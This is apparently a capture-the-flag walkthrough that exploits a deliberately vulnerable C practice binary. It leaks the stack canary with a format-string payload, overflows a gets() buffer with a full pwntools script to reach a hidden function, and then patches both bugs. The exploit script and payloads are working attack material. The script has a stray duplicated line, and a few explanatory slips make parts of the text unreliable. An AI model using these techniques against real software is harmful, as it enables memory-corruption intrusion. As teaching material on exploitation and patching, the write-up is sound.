Let's take a look at the source code...

```
#include <stdlib.h>
#include <stdio.h>

void revelation()
{
  char light[489];
  fgets(light, sizeof(light) - 1, stdin);
  printf(light);
}

void pivot() 
{
  char reroute[10];
  gets(reroute);
}

int main()
{
  revelation();
  pivot();
}

void discovery()
{
         puts("My best engineers assured me that this code was impenetrable. You have shed some light into this matter. Level Cleared!");
}
```

As you can see the code is altered from the 64 bit version to make things run smoother. Now let's look at what binary mitigations are in place using pwntools.

```
$	pwn checksec d0_64 
[*] '/Hackery/escape/def_ovr/d0_64/d0_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we can see that there is a stack canary, and non-executable stack (NX). A stack canary is a binary mitigation technique designed to catch buffer overflows. What it does is it puts a piece of data inbetween where a buffer overflow could possibly start and the return address (for x64 programs it's stored in the rbp register). It creates this at the start of the function and then checks it at the end, and it it's changed then it knows a buffer overflow has happened and will immediately terminate the program. What a non-executable stack will do, is it will make all space that a user can write to unable to be executed. This will stop an attacker from simply pushing shellcode onto the stack, then overflowing the return address to jump to the shellcode. Fortunately both of these are just mitigations that are designed to make it harder to carry out a buffer overflow attack, but it is still possible.

When we look at the code itself we see two seperate vulnerabillities. The first that will be executed is a format string exploit with a printf function in the revelation function. The second is a buffer overflow exploit with a gets function in the main function. We see that our objective is to run the discovery function, which is never called in the code. We can do this by simply using a buffer overflow function to write over the return address with the address of the revelation function, thus redirecting code execution flow to that function. The non-executable stack will not impede the exploit at all, since we are not trying to run shellcode. However the Stack Canary will impede us, since we have to write over it to reach the return address. However if we write over the stack canary with the stack canary, then when it checks to see if the stack canary has been changed it will see that it is the same as it started and our exploit should work. In order to do this, we will need to leake the canary which is randomly generated for every instance of the program. 

We might be able to use the format string exploit in the revelation function to read the stack canary. Thing is the canary for the revelation function, and the main function should be the same canary (even though the canary is randomly generated for every instance of the program). So if we used the format string exploit in revelation to read the canary, then used it to overwrite the canary in main, it should work. To figure out how to read the canary, we will need to look at the assembly for the revelation function.

```
Dump of assembler code for function revelation:
   0x0804850b <+0>: push   ebp
   0x0804850c <+1>: mov    ebp,esp
   0x0804850e <+3>: sub    esp,0x1f8
   0x08048514 <+9>: mov    eax,gs:0x14
   0x0804851a <+15>:  mov    DWORD PTR [ebp-0xc],eax
   0x0804851d <+18>:  xor    eax,eax
   0x0804851f <+20>:  mov    eax,ds:0x804a040
   0x08048524 <+25>:  sub    esp,0x4
   0x08048527 <+28>:  push   eax
   0x08048528 <+29>:  push   0x1e8
   0x0804852d <+34>:  lea    eax,[ebp-0x1f5]
   0x08048533 <+40>:  push   eax
   0x08048534 <+41>:  call   0x80483c0 <fgets@plt>
   0x08048539 <+46>:  add    esp,0x10
   0x0804853c <+49>:  sub    esp,0xc
   0x0804853f <+52>:  lea    eax,[ebp-0x1f5]
   0x08048545 <+58>:  push   eax
   0x08048546 <+59>:  call   0x80483a0 <printf@plt>
   0x0804854b <+64>:  add    esp,0x10
   0x0804854e <+67>:  nop
   0x0804854f <+68>:  mov    eax,DWORD PTR [ebp-0xc]
   0x08048552 <+71>:  xor    eax,DWORD PTR gs:0x14
   0x08048559 <+78>:  je     0x8048560 <revelation+85>
   0x0804855b <+80>:  call   0x80483d0 <__stack_chk_fail@plt>
   0x08048560 <+85>:  leave  
   0x08048561 <+86>:  ret    
End of assembler dump.
```

So we can see at the end, it calls the stack check function so we know it has a stack canary. At the beginning of the assembly code, we can see where the stack canary will be stored.

```
   0x0804850e <+3>: sub    esp,0x1f8
   0x08048514 <+9>: mov    eax,gs:0x14
   0x0804851a <+15>:  mov    DWORD PTR [ebp-0xc],eax
```

So the stack canary is stored at least 0x1f8 (506) bytes down the stack. We will be reading the data in 4 byte segments, so we can read the 506 bytes in 126 DWORDS. We should push it to 130 because the stack canary is probably beyond that. Let's try it.

```
$	python -c 'print "%x."*130' | ./d0 
1e8.f7faf5a0.f7fefef9.25000070.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.a2e.f7e8d54b.ffffcffe.ffffd0fc.e0.0.f7ffd000.f7ffd918.ffffd000.80482b3.0.ffffd094.f7faf000.3d57.ffffffff.2f.f7e09dc8.f7fd5858.8000.f7faf000.f7fad244.f7e150ec.1.7.f7e2ba50.fbc09000.1.ffffd0f4.ffffd048.
```

So we can see here, the stack canary for this instance was 0xfbc09000, and located 127 DWORDS down the stack. If you run it multiple times, you see that it changes for each instance which is expected. In addition to that we can see that the least significant bit is a null byte (\x00) which is a characteristic of stack canaries. Now that we have the stack canary, let's figure out how far it is from the start of the buffer overflow so we can write over it. For that we will use gdb. 

```
gdb-peda$ disas revelation
Dump of assembler code for function revelation:
   0x0804850b <+0>: push   ebp
   0x0804850c <+1>: mov    ebp,esp
   0x0804850e <+3>: sub    esp,0x1f8
   0x08048514 <+9>: mov    eax,gs:0x14
   0x0804851a <+15>:  mov    DWORD PTR [ebp-0xc],eax
   0x0804851d <+18>:  xor    eax,eax
   0x0804851f <+20>:  mov    eax,ds:0x804a040
   0x08048524 <+25>:  sub    esp,0x4
   0x08048527 <+28>:  push   eax
   0x08048528 <+29>:  push   0x1e8
   0x0804852d <+34>:  lea    eax,[ebp-0x1f5]
   0x08048533 <+40>:  push   eax
   0x08048534 <+41>:  call   0x80483c0 <fgets@plt>
   0x08048539 <+46>:  add    esp,0x10
   0x0804853c <+49>:  sub    esp,0xc
   0x0804853f <+52>:  lea    eax,[ebp-0x1f5]
   0x08048545 <+58>:  push   eax
   0x08048546 <+59>:  call   0x80483a0 <printf@plt>
   0x0804854b <+64>:  add    esp,0x10
   0x0804854e <+67>:  nop
   0x0804854f <+68>:  mov    eax,DWORD PTR [ebp-0xc]
   0x08048552 <+71>:  xor    eax,DWORD PTR gs:0x14
   0x08048559 <+78>:  je     0x8048560 <revelation+85>
   0x0804855b <+80>:  call   0x80483d0 <__stack_chk_fail@plt>
   0x08048560 <+85>:  leave  
   0x08048561 <+86>:  ret    
End of assembler dump.
gdb-peda$ b *revelation+64
Breakpoint 1 at 0x804854b
gdb-peda$ disas pivot
Dump of assembler code for function pivot:
   0x08048562 <+0>: push   ebp
   0x08048563 <+1>: mov    ebp,esp
   0x08048565 <+3>: sub    esp,0x18
   0x08048568 <+6>: mov    eax,gs:0x14
   0x0804856e <+12>:  mov    DWORD PTR [ebp-0xc],eax
   0x08048571 <+15>:  xor    eax,eax
   0x08048573 <+17>:  sub    esp,0xc
   0x08048576 <+20>:  lea    eax,[ebp-0x16]
   0x08048579 <+23>:  push   eax
   0x0804857a <+24>:  call   0x80483b0 <gets@plt>
   0x0804857f <+29>:  add    esp,0x10
   0x08048582 <+32>:  nop
   0x08048583 <+33>:  mov    eax,DWORD PTR [ebp-0xc]
   0x08048586 <+36>:  xor    eax,DWORD PTR gs:0x14
   0x0804858d <+43>:  je     0x8048594 <pivot+50>
   0x0804858f <+45>:  call   0x80483d0 <__stack_chk_fail@plt>
   0x08048594 <+50>:  leave  
   0x08048595 <+51>:  ret    
End of assembler dump.
gdb-peda$ b *pivot+29
Breakpoint 2 at 0x804857f
gdb-peda$ r
Starting program: /Hackery/escape/def_ovr/d0/d0 
%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
1e8.f7faf5a0.f7fefef9.25000070.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.ffff000a.1.c2.f7e8d54b.ffffcfbe.ffffd0bc.e0.0.f7ffd000.f7ffd918.ffffcfc0.80482b3.0.ffffd054.f7faf000.3d57.ffffffff.2f.f7e09dc8.f7fd5858.8000.f7faf000.f7fad244.f7e150ec.1.7.f7e2ba50.6032d100.
```

So we can see here that the canary is 0x6032d100. Now let's go to the second Breakpoint so we can see the offsets between the start of our buffer overflow, and the stack canary and the return address.

```
Breakpoint 1, 0x0804854b in revelation ()
gdb-peda$ c
Continuing.
escape
```

And then breakpoint 2

```
Breakpoint 2, 0x0804857f in pivot ()
gdb-peda$ find escape
Searching for 'escape' in: None ranges
Found 5 results, display max 5 items:
 [heap] : 0x804b008 ("escape\nx.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"...)
[stack] : 0xffffcfe2 ("escape")
[stack] : 0xffffd295 ("escape/def_ovr/d0/d0")
[stack] : 0xffffdc3f ("escape/def_ovr/d0")
[stack] : 0xffffdfe3 ("escape/def_ovr/d0/d0")
gdb-peda$ x/x $ebp-0x16
0xffffcfe2: 0x65
gdb-peda$ info frame
Stack level 0, frame at 0xffffd000:
 eip = 0x804857f in pivot; saved eip = 0x80485b1
 called by frame at 0xffffd020
 Arglist at 0xffffcff8, args: 
 Locals at 0xffffcff8, Previous frame's sp is 0xffffd000
 Saved registers:
  ebp at 0xffffcff8, eip at 0xffffcffc
gdb-peda$ find 0x6032d100
Searching for '0x6032d100' in: None ranges
Found 4 results, display max 4 items:
 mapped : 0xf7ffb954 --> 0x6032d100 
[stack] : 0xffffc8dc --> 0x6032d100 
[stack] : 0xffffc930 --> 0x6032d100 
[stack] : 0xffffcfec --> 0x6032d100 
```

So we can see that our buffer overflow starts at 0xffffcfe2. We see that the return address in the eip register is at 0xffffcffc. We can also see that the stack canary that we need to overwrite is at 0xffffcfec (the rest are at a lower address than the start of our buffer, and since buffer overflows work towards higher addresses we can't write to it). So to calculate the offsets.

```
>>> 0xffffcffc - 0xffffcfe2
26
>>> 0xffffcfec - 0xffffcfe2
10
```

So we can see, that we have 26 bytes untill the return address, and 10 bytes to the stack canary. So we will have to write 10 characters, then the stack canary, then 12 more characters (keep in mind the the canary itself takes up 4 characters), and then the address of the discovery function. It would be best to put this all together in a script, which is what I have done. I have modified the format string read to put the canary between two unique strings, that way we can easily parse it.

```
#Import pwntools and regular expressions
from pwn import *
import re

#Designate which elf we are using, and run it
target = process("./d0")
elf = ELF("./d0")
context(binary=elf)

#Send the format string exploit to leak the canary
target.sendline("%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%xesc%xape")

#Store the output of the format string memory leak
memleak = target.recvline()

#Parse out the canary from the rest of the memory leak
canary = str(re.findall(r'esc(.*?)ape', memleak))

#Remove excess characters, print and convert the canary to a hex string
canary = canary.replace("['", "")
canary = canary.replace("']", "")
canary = "0x" + canary
print "The Canary Is: " + canary
canary = int(canary, 16)

#Designate the first and second filler segments
filler0 = "0"*10
filler1 = "0"*12  

#Pull the symbol for the discovery function address
address = elf.symbols["discovery"]

#Construct the payload by combining the two filler segments, the canary and discovery address (in little endian)
payload = filler0 + p32(canary) + filler1 + p32(address)

#Send the payload (and print it)
print "Sending: " + str(payload)
target.sendline(payload)

#Print the program's output, which should include "Level Cleared!"
print target.recvline()h should include "Level Cleared!"
print target.recvline()
```

Now let's test it.

```
$ python exploit.py 
[+] Starting local process './d0': pid 18332
[*] '/Hackery/escape/def_ovr/d0/d0'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
The Canary Is: 0x4df2f000
Sending: 0000000000\x00��M000000000000\xbf\x85\x0
My best engineers assured me that this code was impenetrable. You have shed some light into this matter. Level Cleared!

[*] Stopped process './d0' (pid 18332)
```

Just like that, we pwned the binary! Now to patch it.

```
$ cat d0_secure.c
#include <stdlib.h>
#include <stdio.h>

void revelation()
{
  char light[489];
  fgets(light, sizeof(light) - 1, stdin);
  printf("%s\n", light);
}

void pivot() 
{
  char reroute[10];
  fgets(reroute, sizeof(reroute) - 1, stdin);
}

int main()
{
  revelation();
  pivot();
}

void discovery()
{
         puts("My best engineers assured me that this code was impenetrable. You have shed some light into this matter. Level Cleared!");
}
```

As you can see, we formatted the char array we are printing as a string, and limited the characters that we are inputting into the reroute char array. This should fix the format string and buffer overflow vulnerabillities. Let's test it!

```
$ ./d0_secure 
%x.%x.%x.%x.%x
%x.%x.%x.%x.%x

00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

As you can see, the format string and buffer overflow exploits both failed. Just like that, we patched the binary!